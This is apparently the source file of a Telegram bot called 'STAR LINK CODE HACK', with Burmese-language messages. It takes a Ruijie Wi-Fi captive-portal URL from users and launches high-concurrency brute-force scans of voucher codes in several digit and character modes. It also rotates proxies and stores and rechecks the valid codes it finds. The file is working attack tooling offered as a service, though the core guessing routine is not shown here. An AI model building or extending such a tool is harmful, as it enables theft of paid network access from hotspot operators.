# ==================== COMMAND HANDLERS ====================
bot = state.bot

@bot.message_handler(commands=['start'])
async def cmd_start(message):
    """Handle /start command."""
    user = state.get_user(message.chat.id)

    user_name = message.from_user.first_name or message.from_user.username or "User"
    user_id = str(message.chat.id)

    # Rate limiting
    limiter = state.get_rate_limiter(message.chat.id)
    if not await limiter.acquire():
        await bot.reply_to(message, "⚠️ Please slow down and try again.")
        return

    welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

🎉 မင်္ဂလာပါ!
အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။

🤖 Bot Version: 2.0.0 (Enterprise)"""

    await bot.send_message(message.chat.id, welcome_text, reply_markup=Keyboards.main())


@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    """Handle all callback queries."""
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"

    # Rate limiting
    limiter = state.get_rate_limiter(chat_id)
    if not await limiter.acquire():
        await bot.answer_callback_query(call.id, "⚠️ Please slow down.", show_alert=True)
        return

    user = state.get_user(chat_id)

    # ── Back to main menu ───────────────────────────────
    if call.data == "menu_back":
        text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=Keyboards.main()
        )
        await bot.answer_callback_query(call.id)
        return

    # ── Portal URL instructions ─────────────────────────
    if call.data == "menu_free_trial":
        text = """🔗 Portal URL ထည့်သွင်းရန်:

/portal [your_portal_url]

ဥပမာ:
/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00

Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်ဖြစ်သည်။"""
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=Keyboards.back()
        )
        await bot.answer_callback_query(call.id)
        return

    # ── Start scan ──────────────────────────────────────
    if call.data == "menu_start_scam":
        async with state.active_scans_lock:
            if state.active_scans_count >= config.MAX_CONCURRENT_SCANS:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"⚠️ Bot အလုပ်များနေပါသည်။ {state.active_scans_count}/{config.MAX_CONCURRENT_SCANS} ယောက် scan လုပ်နေပါသည်။

ခဏစောင့်ပြီးမှ ထပ်ကြိုးစားပါ။",
                    reply_markup=Keyboards.back()
                )
                await bot.answer_callback_query(call.id)
                return
            state.active_scans_count += 1

        if not user.selected_mode:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="❌ VOUCHER အမျိုးအစားမရွေးရသေးပါ။ VOUCHER အရင်ရွေးပါ။",
                reply_markup=Keyboards.voucher()
            )
            await bot.answer_callback_query(call.id)
            return

        if not user.session_url:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:

/portal [your_portal_url]",
                reply_markup=Keyboards.back()
            )
            await bot.answer_callback_query(call.id)
            return

        # Check for existing scan
        existing = state.scan_tasks.get(chat_id)
        if existing and not existing.task.done():
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
                reply_markup=Keyboards.scam_control()
            )
            await bot.answer_callback_query(call.id)
            return

        mode = user.selected_mode
        start_digit = user.start_digit

        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"🔍 Scan စတင်နေပါသည်...

🔢 VOUCHER Mode: {mode}

STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
            reply_markup=Keyboards.scam_control()
        )

        progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...

")
        scan_id = str(uuid.uuid4())

        # Notify admins
        try:
            portal_url = user.session_url
            if portal_url and portal_url != user.last_admin_notified_url:
                msg = (
                    f"🚀 **Scan Start**

"
                    f"👤 **User:** {user_name}
"
                    f"🆔 **ID:** `{user_id}`
"
                    f"🔢 **Mode:** {mode}
"
                    f"🔗 **Portal:**
`{portal_url}`"
                )
                for admin_id in config.ADMIN_IDS:
                    try:
                        await bot.send_message(admin_id, msg, parse_mode="Markdown")
                    except Exception as e:
                        logger.debug(f"Admin notify error: {e}")
                user.last_admin_notified_url = portal_url
        except Exception as e:
            logger.error(f"Admin notify error: {e}")

        # Start scan task
        task = asyncio.create_task(
            run_bruteforce(
                mode, chat_id, user.session_url,
                scan_id, message=call.message,
                progress_msg=progress_msg, start_digit=start_digit
            )
        )
        state.scan_tasks[chat_id] = ScanTask(
            task=task, scan_id=scan_id, mode=mode, chat_id=chat_id
        )

        await bot.answer_callback_query(call.id)
        return

    # ── Results ─────────────────────────────────────────
    if call.data == "menu_result":
        results, _ = await github.get_file("result.json")
        if user_id in results and results[user_id]:
            codes = "
".join(results[user_id])
            text = f"✅ Found Codes:
{codes}"
        else:
            text = "📋 ယခင်ကရရှိထားသော success code မရှိသေးပါ။"

        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=Keyboards.back()
        )
        await bot.answer_callback_query(call.id)
        return

    # ── Recheck ─────────────────────────────────────────
    if call.data == "menu_recheck":
        if not user.session_url:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:

/portal [your_portal_url]",
                reply_markup=Keyboards.back()
            )
            await bot.answer_callback_query(call.id)
            return

        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🔄 Recheck ကို စတင်နေပါသည်...",
            reply_markup=Keyboards.scam_control()
        )
        await recheck_codes(call.message)
        await bot.answer_callback_query(call.id)
        return

    # ── Stop ────────────────────────────────────────────
    if call.data == "menu_stop":
        await stop_scan(call.message)
        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return

    # ── Select voucher mode ─────────────────────────────
    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")

        if not user.session_url:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:

/portal [your_portal_url]",
                reply_markup=Keyboards.back()
            )
            await bot.answer_callback_query(call.id)
            return

        # Digit modes need start digit selection
        if mode in ["6", "7", "8", "9"]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -",
                reply_markup=Keyboards.digit(mode)
            )
            await bot.answer_callback_query(call.id)
            return

        user.selected_mode = mode
        user.start_digit = None

        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"🔍 ရွေးချယ်ထားသော VOUCHER: {mode}

✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
            reply_markup=Keyboards.start_scam()
        )
        await bot.answer_callback_query(call.id)
        return

    # ── Select start digit ──────────────────────────────
    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode = parts[1]
        digit = parts[2]

        user.selected_mode = mode
        user.start_digit = None if digit == "random" else digit

        txt = f"🔍 VOUCHER Mode: {mode}
"
        txt += "🔢 ထိပ်စီးနံပါတ်: Random" if digit == "random" else f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"

        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=txt + "

✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
            reply_markup=Keyboards.start_scam()
        )
        await bot.answer_callback_query(call.id)
        return


@bot.message_handler(commands=['result'])
async def cmd_result(message):
    """Handle /result command."""
    results, _ = await github.get_file("result.json")
    uid = str(message.chat.id)

    if uid in results and results[uid]:
        codes = "
".join(results[uid])
        await bot.reply_to(message, f"✅ Found Codes:
{codes}")
    else:
        await bot.reply_to(message, "ယခင်ကရရှိထားသော code မရှိသေးပါ။")


async def recheck_codes(message) -> None:
    """Recheck saved codes."""
    chat_id = message.chat.id
    user = state.get_user(chat_id)

    results, sha = await github.get_file("result.json")
    uid = str(chat_id)

    if uid not in results or not results[uid]:
        await bot.reply_to(message, "ယခင် success code တစ်ခုမျှမရှိသေးပါ။")
        return

    if not user.session_url:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return

    await bot.reply_to(message, "Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")

    recheck_list = []
    for code in results[uid]:
        result = await perform_check(
            user.session_url, code, chat_id,
            scan_id=None, recheck=True, message=message
        )
        if result:
            recheck_list.append(result)

    to_show = "
".join(recheck_list) if recheck_list else "မည်သည့် success code မျှမကျန်ပါ။"
    await bot.reply_to(message, f"✅ Rechecked Codes:

{to_show}")

    # Save rechecked codes
    results[uid] = recheck_list
    await github.update_file("result.json", results, sha, f"Recheck update for {uid}")


@bot.message_handler(commands=['recheck'])
async def cmd_recheck(message):
    """Handle /recheck command."""
    await recheck_codes(message)


@bot.message_handler(commands=['portal'])
async def cmd_portal(message):
    """Handle /portal command."""
    args = message.text.split(maxsplit=1)

    if len(args) < 2:
        await bot.reply_to(
            message,
            "🔗 Portal URL ထည့်သွင်းရန်:

"
            "/portal [your_portal_url]

"
            "ဥပမာ:
"
            "/portal https://portal-as.ruijienetworks.com/download/static/"
            "maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00"
        )
        return

    url = args[1].strip()
    user = state.get_user(message.chat.id)

    # Basic URL validation
    if not url.startswith(('http://', 'https://')):
        await bot.reply_to(message, "❌ URL မှားယွင်းနေပါသည်။ http:// သို့မဟုတ် https:// ဖြင့်စပါ။")
        return

    await bot.reply_to(message, "🔗 Portal URL စစ်ဆေးနေပါသည်...")

    if await validate_portal_url(url):
        user.session_url = url
        await bot.reply_to(
            message,
            "✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။

VOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
            reply_markup=Keyboards.voucher()
        )
    else:
        await bot.reply_to(
            message,
            "❌ Portal URL မှားယွင်းနေပါသည်။ ပြန်လည်စစ်ဆေးပါ။

"
            "✅ မှန်ကန်တဲ့ URL ပုံစံ:
"
            "`https://portal-as.ruijienetworks.com/download/static/maccauth/"
            "src/index.html?lang=en_US&mac=02:00:00:00:00:00`",
            parse_mode="Markdown"
        )


async def validate_portal_url(session_url: str) -> bool:
    """Validate portal URL by checking for session indicators."""
    headers = {
        'accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }

    proxy = get_next_proxy() if config.ENABLE_PROXY else None

    try:
        async with state.session.get(
            session_url,
            allow_redirects=True,
            headers=headers,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=config.PORTAL_CHECK_TIMEOUT)
        ) as resp:
            if resp.status >= 400:
                return False

            final_url = str(resp.url)
            text = await resp.text()

            # Check for session indicators
            indicators = ["sessionId", "portal-as.ruijienetworks.com", "maccauth", "lang=en_US"]
            if any(ind in final_url or ind in text for ind in indicators):
                return True

            # Check patterns
            patterns = [
                r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)',
                r'[?&]sessionId=([a-zA-Z0-9]+)',
            ]
            if any(re.search(p, text, re.IGNORECASE) for p in patterns):
                return True

            # Generic portal indicators
            if "portal" in text.lower() or "captcha" in text.lower():
                return True

            return False

    except asyncio.TimeoutError:
        logger.warning("Portal URL validation timeout")
        return False
    except Exception as e:
        logger.error(f"Portal validation error: {e}")
        return False


@bot.message_handler(commands=['scan'])
async def cmd_scan(message):
    """Handle /scan command."""
    args = message.text.split(maxsplit=1)
    chat_id = message.chat.id
    user_id = str(chat_id)
    user = state.get_user(chat_id)

    if len(args) < 2:
        await bot.reply_to(
            message,
            "VOUCHER ရွေးချယ်ရန်:

"
            "/scan 6, 7, 8, 9, ascii-lower, ascii-lower9, all, mixed, mixed7, mixed8, mixed9",
            reply_markup=Keyboards.voucher()
        )
        return

    mode = args[1].strip()

    if not user.session_url:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return

    # Check for existing scan
    existing = state.scan_tasks.get(chat_id)
    if existing and not existing.task.done():
        await bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။")
        return

    # Validate mode
    valid_modes = ["6", "7", "8", "9", "ascii-lower", "ascii-lower9", "all", "mixed", "mixed7", "mixed8", "mixed9"]
    if mode not in valid_modes:
        await bot.reply_to(message, f"❌ Invalid mode. Use: {', '.join(valid_modes)}")
        return

    progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...

")
    scan_id = str(uuid.uuid4())

    # Notify admins
    try:
        user_name = message.from_user.first_name or message.from_user.username or "User"
        portal_url = user.session_url
        if portal_url and portal_url != user.last_admin_notified_url:
            msg = (
                f"🚀 **Scan (/scan)**
"
                f"👤 **User:** {user_name}
"
                f"🆔 **ID:** `{user_id}`
"
                f"🔢 **Mode:** {mode}
"
                f"🔗 **Portal:**
`{portal_url}`"
            )
            for admin_id in config.ADMIN_IDS:
                try:
                    await bot.send_message(admin_id, msg, parse_mode="Markdown")
                except Exception:
                    pass
            user.last_admin_notified_url = portal_url
    except Exception as e:
        logger.error(f"Admin notify error in /scan: {e}")

    # Start scan
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user.session_url, scan_id,
                       message=message, progress_msg=progress_msg)
    )
    state.scan_tasks[chat_id] = ScanTask(
        task=task, scan_id=scan_id, mode=mode, chat_id=chat_id
    )


@bot.message_handler(commands=['status'])
async def cmd_status(message):
    """Handle /status command (admin only)."""
    if not state.is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return

    hours, minutes, seconds = state.uptime
    active_scans = sum(1 for t in state.scan_tasks.values() if not t.task.done())

    await bot.reply_to(
        message,
        f"📊 Bot Status

"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s
"
        f"🔍 Active Scans: {active_scans}/{config.MAX_CONCURRENT_SCANS}
"
        f"👥 Sessions: {len(state.users)}
"
        f"📦 Queue: {state.success_queue.qsize()}
"
        f"🤖 Version: 2.0.0"
    )


@bot.message_handler(commands=['stop'])
async def cmd_stop(message):
    """Handle /stop command."""
    await stop_scan(message)


async def stop_scan(message) -> None:
    """Stop active scan for user."""
    chat_id = message.chat.id
    task = state.scan_tasks.get(chat_id)

    if task and not task.task.done():
        task.stop = True
        task.scan_id = None
        await send_success_file(chat_id)
        task.task.cancel()

        state.success_messages.pop(chat_id, None)
        state.success_texts.pop(chat_id, None)
        state.limited_messages.pop(chat_id, None)
        state.limited_texts.pop(chat_id, None)

        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=Keyboards.back())
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=Keyboards.back())


@bot.message_handler(commands=['help'])
async def cmd_help(message):
    """Handle /help command."""
    help_text = """📚 Available Commands:

/start - Bot စတင်ရန်
/portal <url> - Portal URL ထည့်ရန်
/scan <mode> - Code ရှာဖွေရန်
/stop - Scan ရပ်ရန်
/recheck - Codes ပြန်စစ်ရန်
/result - ရလဒ်ကြည့်ရန်
/status - Bot status (Admin only)
/help - ဤစာမျက်နှာ

Scan Modes:
• 6, 7, 8, 9 - Digit codes
• ascii-lower - 6-char lowercase letters
• ascii-lower9 - 9-char lowercase letters
• all - 6-char alphanumeric
• mixed, mixed7, mixed8, mixed9 - Mixed codes"""

    await bot.reply_to(message, help_text)


# ==================== SESSION CLEANUP ====================
async def session_cleanup_scheduler() -> None:
    """Periodically clean up expired sessions."""
    while not state._shutdown_event.is_set():
        try:
            await asyncio.wait_for(state._shutdown_event.wait(), timeout=3600)  # Every hour
            break
        except asyncio.TimeoutError:
            pass
        state.cleanup_expired_sessions()


# ==================== POLLING ====================
async def start_polling() -> None:
    """Start Telegram polling with auto-reconnect."""
    backoff = 5

    while not state._shutdown_event.is_set():
        try:
            logger.info("Starting Telegram polling...")
            await bot.infinity_polling(
                timeout=45,
                request_timeout=55,
                interval=0,
            )
            return
        except asyncio.CancelledError:
            raise
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.warning(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            logger.error(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)


# ==================== MAIN ====================
async def main() -> None:
    """Main entry point."""
    logger.info("=" * 60)
    logger.info("STAR LINK CODE HACK Bot v2.0.0 (Enterprise)")
    logger.info("=" * 60)

    # Setup signal handlers for graceful shutdown
    loop = asyncio.get_running_loop()

    def signal_handler():
        logger.info("Shutdown signal received")
        state._shutdown_event.set()

    for sig in (signal.SIGTERM, signal.SIGINT):
        loop.add_signal_handler(sig, signal_handler)

    # Initialize HTTP session
    state.connector = aiohttp.TCPConnector(
        limit=20000,
        limit_per_host=10000,
        ttl_dns_cache=300,
        ssl=False
    )
    state.session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=config.HTTP_TIMEOUT),
        connector=state.connector,
        connector_owner=False
    )

    try:
        # Start background tasks
        tasks = [
            asyncio.create_task(start_web_server(), name="web_server"),
            asyncio.create_task(github_sync_scheduler(), name="github_sync"),
            asyncio.create_task(session_cleanup_scheduler(), name="session_cleanup"),
            asyncio.create_task(start_polling(), name="polling"),
        ]

        logger.info(f"Started {len(tasks)} background tasks")
        logger.info(f"Web server: port {config.WEB_PORT}")
        logger.info(f"Concurrency: {config.CONCURRENCY}")
        logger.info(f"Max scans: {config.MAX_CONCURRENT_SCANS}")

        # Wait for shutdown
        await state._shutdown_event.wait()

        logger.info("Shutting down...")

        # Cancel all tasks
        for task in tasks:
            task.cancel()

        # Wait for tasks to finish
        await asyncio.gather(*tasks, return_exceptions=True)

    finally:
        # Cleanup
        if state.session:
            await state.session.close()
        if state.connector:
            await state.connector.close()
        logger.info("Shutdown complete")


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Interrupted by user")
    except Exception as e:
        logger.critical(f"Fatal error: {e}")
        sys.exit(1)
